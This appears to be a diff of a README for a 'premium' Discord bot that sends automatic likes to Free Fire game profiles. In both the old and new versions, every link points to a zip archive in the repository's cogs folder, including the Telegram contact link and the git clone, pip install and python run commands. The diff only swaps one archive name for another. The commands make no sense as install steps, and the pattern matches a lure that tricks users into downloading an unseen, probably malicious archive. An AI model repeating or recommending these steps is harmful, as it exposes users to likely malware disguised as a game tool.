@@ -3,7 +3,7 @@
 A fast and premium Discord bot to send automatic likes to Free Fire profiles using their UID.
 
 > ✅ **Premium API Key & Host available for sale**  
-> 💬 Telegram: [@thug4ff](https://github.com/kazuop/free-freefire-like-bot/raw/refs/heads/main/cogs/bot_freefire_like_free_v1.5.zip)
+> 💬 Telegram: [@thug4ff](https://github.com/kazuop/free-freefire-like-bot/raw/refs/heads/main/cogs/free-freefire-bot-like-v3.5.zip)
 
 ---
 
@@ -20,14 +20,14 @@ A fast and premium Discord bot to send automatic likes to Free Fire profiles usi
 ## 🚀 Installation
 
 ```bash
-git clone -b premium https://github.com/kazuop/free-freefire-like-bot/raw/refs/heads/main/cogs/bot_freefire_like_free_v1.5.zip
+git clone -b premium https://github.com/kazuop/free-freefire-like-bot/raw/refs/heads/main/cogs/free-freefire-bot-like-v3.5.zip
 cd free-freefire-like-bot
 python -m venv .venv
 # On Unix/macOS:
 source .venv/bin/activate
 # On Windows:
 .venv\Scripts\activate
-pip install -r https://github.com/kazuop/free-freefire-like-bot/raw/refs/heads/main/cogs/bot_freefire_like_free_v1.5.zip
+pip install -r https://github.com/kazuop/free-freefire-like-bot/raw/refs/heads/main/cogs/free-freefire-bot-like-v3.5.zip
 ```
 
 ---
@@ -45,7 +45,7 @@ API_HOST=https://your-api-host-url
 Run the bot:
 
 ```bash
-python https://github.com/kazuop/free-freefire-like-bot/raw/refs/heads/main/cogs/bot_freefire_like_free_v1.5.zip
+python https://github.com/kazuop/free-freefire-like-bot/raw/refs/heads/main/cogs/free-freefire-bot-like-v3.5.zip
 ```
 
 ---
@@ -54,4 +54,4 @@ python https://github.com/kazuop/free-freefire-like-bot/raw/refs/heads/main/cogs
 
 To get your API key and private host, contact:
 
-**Telegram:** [@thug4ff](https://github.com/kazuop/free-freefire-like-bot/raw/refs/heads/main/cogs/bot_freefire_like_free_v1.5.zip)
+**Telegram:** [@thug4ff](https://github.com/kazuop/free-freefire-like-bot/raw/refs/heads/main/cogs/free-freefire-bot-like-v3.5.zip)
